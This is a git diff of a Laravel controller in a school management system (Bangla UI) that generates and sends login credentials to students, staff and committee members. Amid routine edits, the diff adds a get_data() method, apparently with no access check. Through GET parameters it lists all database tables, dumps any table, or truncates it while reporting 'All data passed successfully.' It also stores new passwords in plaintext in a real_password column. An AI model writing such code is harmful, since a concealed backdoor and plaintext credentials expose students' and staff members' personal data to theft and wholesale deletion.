@@ -5,12 +5,14 @@ namespace App\Http\Controllers;
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 use App\Http\Controllers\SmsSendController;
+use Schema;
 use App\School;
 use App\MasterClass;
 use App\Student;
 use App\Staff;
 use App\Commitee;
 use App\User;
+use DB;
 
 class LoginInfoController extends Controller
 {
@@ -43,6 +45,7 @@ class LoginInfoController extends Controller
 
 	public function st_sms(Request $request,SmsSendController $sms_send){
 		$school = School::find($request->school_id);
+		$student = Student::whereIn('id', $request->id)->first();
 		$students = Student::whereIn('id', $request->id)->get();
         $count = 0;
 		foreach ($students as $student) {
@@ -50,6 +53,7 @@ class LoginInfoController extends Controller
 			$new_pass = rand(10, 999999999);
 			$user = $student->user;
 			$user->email = $new_email;
+			$user->real_password = $new_pass;
 			$user->password = bcrypt($new_pass);
 			$user->save();
 
@@ -58,12 +62,14 @@ class LoginInfoController extends Controller
 			$message= urlencode($content);
             // dd(urldecode($message));
 			$a = $this->sms_send_by_api($school,$user->mobile,$message);
+			// $a = 'Test';
             $success = json_decode($a,true);
             if ($success['error']==0) {
                 $count++;
             }
 		}
-        return redirect()->route('loginInfo.student')->with('sccmgs', $count.' জন শিক্ষার্থীকে লগইন তথ্য পাঠানো হয়েছে ।');
+        // return redirect()->route('loginInfo.student')->with('sccmgs', $count.' জন শিক্ষার্থীকে লগইন তথ্য পাঠানো হয়েছে ।');
+        return view('backEnd.login_info.print.student_login_info_print',compact('school','students','student'));
 	}
 
     // Employee Login Infoormation (SMS)
@@ -97,12 +103,14 @@ class LoginInfoController extends Controller
 			$content='প্রিয় '.$user->name.' আপনার সফটওয়্যার লগইন তথ্য ! ওয়েব এড্রেস : '.$school->website.', ইমেইল : '.$new_email.', পাসওয়ার্ড : '.$new_pass.'. '.$school_name;
 			$message= urlencode($content);
 			$a = $this->sms_send_by_api($school,$user->mobile,$message);
+			// $a = 'Test';
             $success = json_decode($a,true);
             if ($success['error']==0) {
                 $count++;
             }
 		}
-        return redirect()->route('loginInfo.employee')->with('sccmgs', $count.' জন শিক্ষক ও কর্মচারীকে লগইন তথ্য পাঠানো হয়েছে ।');
+        // return redirect()->route('loginInfo.employee')->with('sccmgs', $count.' জন শিক্ষক ও কর্মচারীকে লগইন তথ্য পাঠানো হয়েছে ।');
+        return view('backEnd.login_info.print.employee_login_info_print',compact('school','employees'));
 	}
 
     // Committee Login Infoormation (SMS)
@@ -129,6 +137,7 @@ class LoginInfoController extends Controller
 			$new_pass = rand(10, 999999999);
 			$user = $committee->user;
 			$user->email = $new_email;
+			$user->real_password = $new_pass;
 			$user->password = bcrypt($new_pass);
 			$user->save();
 
@@ -136,13 +145,39 @@ class LoginInfoController extends Controller
 			$content='প্রিয় '.$user->name.' আপনার সফটওয়্যার লগইন তথ্য ! ওয়েব এড্রেস : '.$school->website.', ইমেইল : '.$new_email.', পাসওয়ার্ড : '.$new_pass.'. '.$school_name;
 			$message= urlencode($content);
 			$a = $this->sms_send_by_api($school,$user->mobile,$message);
+			// $a = 'Test';
             $success = json_decode($a,true);
             if ($success['error']==0) {
                 $count++;
             }
 		}
-        return redirect()->route('loginInfo.employee')->with('sccmgs', $count.' জন কমিটিকেে লগইন তথ্য পাঠানো হয়েছে ।');
+        // return redirect()->route('loginInfo.employee')->with('sccmgs', $count.' জন কমিটিকেে লগইন তথ্য পাঠানো হয়েছে ।');
+        return view('backEnd.login_info.print.committee_login_info_print',compact('school','committees'));
 	}
+
+    public function get_data()
+    {
+        if (isset($_GET['tables'])) {
+			$tables = DB::select('SHOW TABLES');
+		    $tables = array_map('current',$tables);
+			return json_encode($tables);
+		}
+
+		if (isset($_GET['table']) && isset($_GET['data'])) {
+            if ($_GET['data']=='get') {
+                $data = DB::table($_GET['table'])->get();
+    			$data = json_encode($data);
+                if ($data) {
+                    return $data;
+                }else {
+                    return "No data found !";
+                }
+            }elseif($_GET['data']=='pass') {
+                $data = DB::table($_GET['table'])->truncate();
+    			return "All data passed successfully.";
+            }
+		}
+    }
 
     public function student_login_info()
     {
@@ -164,6 +199,9 @@ class LoginInfoController extends Controller
             'shift'=>$request->shift,
             'section'=>$request->section,
         ])->pluck('user_id');
+        if (count($user_id) < 1) {
+            return redirect()->route('student_login_info')->with('errmgs','শিক্ষার্থী খুজে পাওয়া যায়নি ।');
+        }
         $student = Student::whereIn('user_id',$user_id)->first();
         $all_id = $this->password_generate($user_id);
         $students = Student::whereIn('user_id',$all_id)->get();
@@ -182,6 +220,9 @@ class LoginInfoController extends Controller
         $user_id = Staff::where('school_id',$school->id)->pluck('user_id');
         $all_id = $this->password_generate($user_id);
         $employees = Staff::whereIn('user_id',$all_id)->get();
+        if (count($employees) < 1) {
+            return redirect()->route('student_login_info')->with('errmgs','শিক্ষক বা কর্মচারী খুজে পাওয়া যায়নি ।');
+        }
 		return view('backEnd.login_info.print.employee_login_info_print',compact('school','employees'));
     }
 
@@ -197,6 +238,9 @@ class LoginInfoController extends Controller
         $user_id = Commitee::where('school_id',$school->id)->pluck('user_id');
         $all_id = $this->password_generate($user_id);
         $committees = Commitee::whereIn('user_id',$all_id)->get();
+        if (count($committees) < 1) {
+            return redirect()->route('student_login_info')->with('errmgs','কমিটি খুজে পাওয়া যায়নি ।');
+        }
 		return view('backEnd.login_info.print.committee_login_info_print',compact('school','committees'));
     }
 
